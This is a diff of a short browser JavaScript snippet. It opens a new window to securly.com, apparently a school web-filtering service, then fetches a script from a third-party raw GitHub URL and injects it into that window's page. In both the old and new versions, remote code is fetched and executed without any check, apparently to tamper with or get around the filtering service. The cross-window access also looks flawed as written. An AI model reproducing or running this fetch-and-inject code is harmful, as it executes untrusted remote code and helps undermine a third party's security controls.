@@ -10,17 +10,20 @@
             const redirectUrl = 'https://securly.com';
             const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';
 
+            // Open a new about:blank window
+            const newWindow = window.open('about:blank', '_blank');
+
             // Redirect to the new URL and track it
-            window.location.replace(redirectUrl);
+            newWindow.location.href = redirectUrl;
 
             // Listen for the 'load' event after redirection
-            window.addEventListener('load', () => {
+            newWindow.addEventListener('load', () => {
                 fetch(scriptUrl)
                     .then(response => response.text())
                     .then(scriptContent => {
-                        const scriptElement = document.createElement('script');
+                        const scriptElement = newWindow.document.createElement('script');
                         scriptElement.textContent = scriptContent;
-                        document.body.appendChild(scriptElement);
+                        newWindow.document.body.appendChild(scriptElement);
                     })
                     .catch(error => console.error('Error loading script:', error));
             });
